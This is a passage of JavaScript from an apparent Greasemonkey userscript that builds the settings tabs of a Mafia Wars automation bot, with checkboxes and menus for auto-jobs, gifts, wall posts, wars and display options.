  // Auto-lotto
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoLottoOpt';
  title = ' Play the Daily Chance';
  lottoTitle = 'Play free auto-generated lottery ticket daily'
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':lottoTitle}).appendChild(document.createTextNode(title));

  // Lotto selector
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = ' Collect Daily Chance bonus at: '
  id = 'autoLottoBonus';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));

  id = 'autoLottoList';
  var lottoBonusSelect = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength = autoLottoBonusList.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(autoLottoBonusList[i]));
    lottoBonusSelect.appendChild(choice);
  }
  lottoBonusSelect.selectedIndex = GM_getValue('autoLottoBonusItem', 0);



  // Burn option
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check to prioritize burning of either energy or stamina';
  id = 'burnFirst';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Spend all:'));
  var burnOpt = makeElement('select', rhs, {'id':'burnOption'});
  for (i = 0, iLength=burnModes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(burnModes[i]));
    burnOpt.appendChild(choice);
  }
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' first if both are not maxed'));
  burnOpt.selectedIndex = GM_getValue('burnOption', BURN_ENERGY);

  // Featured jobs
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check to automatically perform featured jobs';
  id = 'featJob';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Perform featured jobs:'));
  var featJobs = makeElement('select', rhs, {'id':'featJobIndex'});
  for (i = 0, iLength=featJobNames.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(featJobNames[i]));
    featJobs.appendChild(choice);
  }
  featJobs.selectedIndex = GM_getValue('featJobIndex', 0);

  // Choose Sides
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Choose sides:'));

  for (i = 0, iLength=cities.length; i < iLength; ++i) {
    var sideOpt;
    if (cities[i][CITY_SIDES].length > 0) {
      id = cities[i][CITY_SIDE_NAME];
      makeElement('label', rhs).appendChild(document.createTextNode(' ' + cities[i][CITY_NAME] + ' '));
      sideOpt = makeElement('select', rhs, {'id':id});

      for (var j = 0, jLength = cities[i][CITY_SIDES].length; j < jLength; ++j) {
        choice = document.createElement('option');
        choice.value = j;
        choice.appendChild(document.createTextNode(cities[i][CITY_SIDES][j]));
        sideOpt.appendChild(choice);
      }

      sideOpt.selectedIndex = GM_getValue(id, 0);
    }
  }

  return generalTab;
}

// Create Display Tab
function createDisplayTab() {
  var title, id, i, item, choice, lhs, rhs;
  var displayTab = makeElement('div', null, {'id':'displayTab', 'class':'tabcontent', 'style':'background-image:url(' + stripURI(bgTabImage) + ')'});

  // Container for a list of settings.
  var list = makeElement('div', displayTab, {'style':'position: relative; top: 10px; margin-left: auto; margin-right: auto; width: 95%; line-height:120%;'});

  // Logging option
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoLog';
  title = 'Check this to enable logging.';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Enable logging:'));
  id = 'autoLogLength';
  makeElement('input', rhs, {'type':'text', 'id':id, 'value':GM_getValue(id, '300'), 'size':'2', 'style':'text-align: left'});
  rhs.appendChild(document.createTextNode(' max # of messages in log'));

  // Player updates
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'logPlayerUpdates';
  title = 'Send Player Updates to Mafia Log.';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Log Player Updates:'));
  id = 'logPlayerUpdatesMax';
  makeElement('input', rhs, {'type':'text', 'id':id, 'value':GM_getValue(id, '25'), 'size':'2', 'style':'text-align: left'});
  rhs.appendChild(document.createTextNode(' max # of updates'));

  // Log filtering
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check this to enable log filtering';
  id = 'filterLog';
  makeElement('input', lhs, {'type':'checkbox', 'title':title, 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Enable log filtering:'));

  id = 'filterOpt';
  var filterOpt = makeElement('select', rhs, {'id':id});
  var filterOptions = ['Accept patterns','Reject patterns'];
  for (i = 0, iLength=filterOptions.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(filterOptions[i]));
    filterOpt.appendChild(choice);
  }
  filterOpt.selectedIndex = GM_getValue(id, 0);

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'filterPatterns';
  var filterText = makeElement('textarea', rhs, {'style':'position: static; width: 15em; height: 7em;', 'id':id, 'title':'Enter each pattern on a separate line.'});
  filterText.appendChild(document.createTextNode(''));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each name pattern on a separate line.'));

  // Handle filterMode changes
  var filterHandler = function() {
    var defaultFilter = filterOpt.selectedIndex == 0 ? defaultPassPatterns.join('\n') : defaultFailPatterns.join('\n');
    var fitlerId = filterOpt.selectedIndex == 0 ? 'filterPass' : 'filterFail';
    filterText.firstChild.nodeValue = GM_getValue(fitlerId, defaultFilter);
  };
  filterHandler();
  filterOpt.addEventListener('change', filterHandler, false);

  // Alignment
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'leftAlign';
  title = 'Align game to the left';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Align game to the left'));

  // mw_masthead always on top
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'mastheadOnTop';
  title = 'Enable to elevate PS MWAP-Header (pause/resume/settings etc) so that it\'s always on top';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Elevate PS MWAP-Header'));

  // Set Facebook account to window title
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'fbwindowtitle';
  title = 'Set window title to name on Facebook account';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Set window title to name on Facebook account'));

  // Show Ice status on the fight list page
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'showPulse';
  title = 'Hide iced targets on the fight list page';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Hide iced targets on the fight list page'));

  // Show Level on the hit list page
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'showLevel';
  title = 'Show player level on the hit list page';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Show level on the hit list page'));

  // Hiding
  item = makeElement('div', list, {'class':'single', 'style':'padding-top: 5px; padding-bottom: 5px;'});
  makeElement('label', item).appendChild(document.createTextNode(' Hide game elements '));

  // Hide gifts
  item = makeElement('div', list, {'class':'single'});
  id = 'hideGifts';
  title = 'Hide gifting items';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Gifting '));

  // Hide Gift Icon
  id = 'hideGiftIcon';
  title = 'Hide Gift Icon';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Gift Icon '));

  // Hide Action Box
  id = 'hideActionBox';
  title = 'Hide daily list on homepage';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Daily List '));

  // Hide Limited Time Offers
  id = 'hideOffer';
  title = 'Hide limited time offers';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Featured Items '));

  // Hide Friend Ladder
  id = 'hideFriendLadder';
  title = 'Hide friend ladder';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Friend Ladder '));

  item = makeElement('div', list, {'class':'single', 'style':'padding-top: 5px;'});
  // Hide Messagecenter Icon
  id = 'hideMessageIcon';
  title = 'Hide Messagecenter Icon';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Messagecenter '));

  // Hide Promo Icon (Poker atm)
  id = 'hidePromoIcon';
  title = 'Hide Promo Icon';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Promo Icon '));

  // Hide Live Updates Icon
  id = 'hideLiveUpdatesIcon';
  title = 'Hide Live Updates Icon';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Live Updates Icon '));

// Hide Icon Row in New Header
  id = 'hideAttentionBox';
  title = 'Hide Icon Row';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Att Block'));

// start a new line
  item = makeElement('div', list, {'class':'single', 'style':'padding-top: 5px;'});

 // hide slot machine
  id = 'HideSlotMachine';
  title = 'Hide Slot Machine';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Slot Machine '));

 // hide collected collections
  id = 'HideCollections';
  title = ' Hide Finished Collection Sets ';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' Finished Collections '));

  // Loot filtering
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Select type of loot you want to see.  For instance Attack will display your top Attack items';
  id = 'filterLoot';
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode('Loot filtering:'));

  id = 'filterLootOpt';
  var filterLootOpt = makeElement('select', rhs, {'id':id});
  var filterOptions = ['Disabled','Attack','Defense','Combined'];
  for (i = 0, iLength=filterOptions.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(filterOptions[i]));
    filterLootOpt.appendChild(choice);
  }
  filterLootOpt.selectedIndex = GM_getValue(id, 0);

  return displayTab;
}

// Create Mafia Tab
function createMafiaTab() {
  var elt, title, id, label, item, lhs, rhs, i, choice;
  var mafiaTab = makeElement('div', null, {'id':'mafiaTab', 'class':'tabcontent', 'style':'background-image:url(' + stripURI(bgTabImage) + ')'});

  // Container for a list of settings.
  var list = makeElement('div', mafiaTab, {'style':'position: relative; top: 10px; margin-left: auto; margin-right: auto; width: 95%; line-height:120%;'});

  // Auto-ask for job help
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check if you want to ask for help automatically with jobs.';
  id = 'autoAskJobHelp';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Ask for job help at:'));
  title = 'Enter the minimum experience to ask for job help, or 0 for no minimum.';
  id = 'autoAskJobHelpMinExp';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '0'), 'title':title, 'id':id, 'size':'2'});
  rhs.appendChild(document.createTextNode(' minimum experience'));

//Automatically Ask for Moscow / Bangkok Help
  var selectMoscowTierDiv = makeElement('div', list);
  lhs = makeElement('div', selectMoscowTierDiv, {'class':'lhs'});
  rhs = makeElement('div', selectMoscowTierDiv, {'class':'rhs'});
  makeElement('br', selectMoscowTierDiv, {'class':'hide'});
  title = 'Ask for Help on Moscow Tiers - Be carefull to only choose available Tiers !';
  id = 'selectMoscowTier';
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Ask for Moscow/Bangkok help :'));
  var selectMoscowTier = makeElement('select', rhs, {'id':id, 'title':title});
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'no Help in Moscow';
  choiceMoscowTier.value = '0';
  if (GM_getValue('selectMoscowTier') == '0') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Baklany';
  choiceMoscowTier.value = '1';
  if (GM_getValue('selectMoscowTier') == '1') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Boets';
  choiceMoscowTier.value = '2';
  if (GM_getValue('selectMoscowTier') == '2') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Brigadir';
  choiceMoscowTier.value = '3';
  if (GM_getValue('selectMoscowTier') == '3') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Avtoritet';
  choiceMoscowTier.value = '4';
  if (GM_getValue('selectMoscowTier') == '4') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Vor';
  choiceMoscowTier.value = '5';
  if (GM_getValue('selectMoscowTier') == '5') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Pakhan';
  choiceMoscowTier.value = '6';
  if (GM_getValue('selectMoscowTier') == '6') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);

  id = 'selectBangkokTier';
  var selectBangkokTier = makeElement('select', rhs, {'id':id, 'title':title, 'style':'margin-left:0.5em;'});
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'no Help in Bangkok';
  choiceBangkokTier.value = '0';
  if (GM_getValue('selectBangkokTier') == '0') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Brawler';
  choiceBangkokTier.value = '1';
  if (GM_getValue('selectBangkokTier') == '1') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Criminal';
  choiceBangkokTier.value = '2';
  if (GM_getValue('selectBangkokTier') == '2') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Pirate';
  choiceBangkokTier.value = '3';
  if (GM_getValue('selectBangkokTier') == '3') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Commandant';
  choiceBangkokTier.value = '4';
  if (GM_getValue('selectBangkokTier') == '4') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Oyabun';
  choiceBangkokTier.value = '5';
  if (GM_getValue('selectBangkokTier') == '5') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Dragon Head';
  choiceBangkokTier.value = '6';
  if (GM_getValue('selectBangkokTier') == '6') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Saboteur';
  choiceBangkokTier.value = '7';
  if (GM_getValue('selectBangkokTier') == '7') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Assassin';
  choiceBangkokTier.value = '8';
  if (GM_getValue('selectBangkokTier') == '8') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);

  // Auto-accept mafia invitations
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Automatically accept mafia invitations.';
  id = 'acceptMafiaInvitations';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Accept mafia invitations'));

  // Auto-publish Miscellaneous Stuff
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  label = makeElement('label', lhs);
  label.appendChild(document.createTextNode('Automatically publish:'));

  // Level up bonus
  title = 'Automatically post level up bonus.';
  id = 'autoLevelPublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Level-up bonus '));

  // Achievement bonus
  title = 'Automatically post achievement bonus.';
  id = 'autoAchievementPublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Achievement bonus '));

  // Iced opponent bonus
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Automatically post iced opponent bonus.';
  id = 'autoIcePublish';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Ice bonus, every '));
  title = 'Enter the publishing Frequency';
  id = 'autoIcePublishFrequency';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '1'), 'title':title, 'id':id, 'size':'1'});
  rhs.appendChild(document.createTextNode(' th time'));

  // Secret Stash
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Automatically post Secret Stash found while fighting.';
  id = 'autoSecretStash';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Secret stash, every '));
  title = 'Enter the publishing Frequency';
  id = 'autoSecretStashFrequency';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '1'), 'title':title, 'id':id, 'size':'1'});
  rhs.appendChild(document.createTextNode(' th time'));

  // Auto-share wishlist
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check if you want to share wishlist.';
  id = 'autoShareWishlist';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Wishlist every: '));
  title = 'Enter the number of hours to wait before sharing wishlist again. Has to be at least 1 hour, and can be decimal (e.g. 1.5).';
  id = 'autoShareWishlistTime';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '1'), 'title':title, 'id':id, 'size':'2'});
  rhs.appendChild(document.createTextNode(' hour(s)'));

  // Auto-help on jobs/wars
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  label = makeElement('label', lhs);
  label.appendChild(document.createTextNode(' Automatically help: '));
  title = 'Automatically help on jobs.';
  id = 'autoHelp';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' On Jobs '));
  title = 'Automatically help on wars.';
  id = 'autoWarHelp';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' On Wars '));
  // Auto-help on burners
  title = 'Automatically supply burners.';
  id = 'autoBurnerHelp';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' On Burners '));
  // Auto-help on parts
  title = 'Automatically supply parts.';
  id = 'autoPartsHelp';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' On Parts '));

  // Betray friends in wars
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Betray a random friend?';
  id = 'autoWarBetray';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Betray friends in wars'));

  // Skip gift wall posts
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoGiftSkipOpt';
  title = 'Check this to skip publishing of wall posts.';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(' Skip gift wall posts'));

  // Option for clicking the gift waiting
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  title = 'Click the gift waiting option';
  id = 'autoGiftWaiting';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Automatically click the gift waiting option'));

  // Option for accepting gifts
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  title = 'Accept all gifts';
  id = 'autoGiftAccept';
  var autoGiftAcceptElt = makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Automatically accept all gifts'));
  rhs.appendChild(document.createTextNode(' '));
  id = 'autoGiftAcceptChoice';
  var autoGiftAcceptChoice = makeElement('select', rhs, {'id':id, 'style':'width: 4em;'});
  for (i = 0, iLength=giftAcceptChoices.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(giftAcceptChoices[i]));
    autoGiftAcceptChoice.appendChild(choice);
  }
  autoGiftAcceptChoice.selectedIndex = GM_getValue('autoGiftAcceptChoice', 0);
  rhs.appendChild(document.createTextNode(' '));
  id = 'autoGiftAcceptReward';
  var autoGiftAcceptReward = makeElement('select', rhs, {'id':id, 'style':'width: 5em;'});
  for (i = 0, iLength=giftAcceptRewards.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(giftAcceptRewards[i]));
    autoGiftAcceptReward.appendChild(choice);
  }
  autoGiftAcceptReward.selectedIndex = GM_getValue('autoGiftAcceptReward', 0);

  // Option for opening Crime Spree gifts
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  title = 'Click to open Crime Spree gifts';
  id = 'autoSafehouse';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Automatically open Crime Spree gifts'));

  // Energy pack settings?
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  label = makeElement('label', lhs);
  label.appendChild(document.createTextNode('Energy Pack Settings:'));

  title = 'Periodically send energy packs to your fellow mafia members.';
  id = 'sendEnergyPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Send Packs '));

  title = 'Periodically ask for energy packs from your fellow mafia members.';
  id = 'askEnergyPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Ask for Packs '));

  title = 'Reward fellow mafia members for sending energy packs.';
  id = 'rewardEnergyPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Reward Mafia'));

  // War - Automatically declare a war
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Declare war against this opponent';
  id = 'autoWar';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Automatically declare war: '));

  // Publish war declaration
  title = 'Automatically publish this war to your mafia so they can help';
  id = 'autoWarPublish';
  makeElement('br', lhs, {'class':'hide'});
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Publish war declaration '));

  // Publish rally for help
  title = 'Automatically publish rally for help';
  id = 'autoWarRallyPublish';
  makeElement('br', lhs, {'class':'hide'});
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Publish rally for help'));

  // Publish call for back up
  title = 'Automatically publish the call for help to your mafia';
  id = 'autoWarResponsePublish';
  makeElement('br', lhs, {'class':'hide'});
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Publish call for help'));

  // Publish reward
  title = 'Automatically publish that you rewarded your mafia for helping';
  id = 'autoWarRewardPublish';
  makeElement('br', lhs, {'class':'hide'});
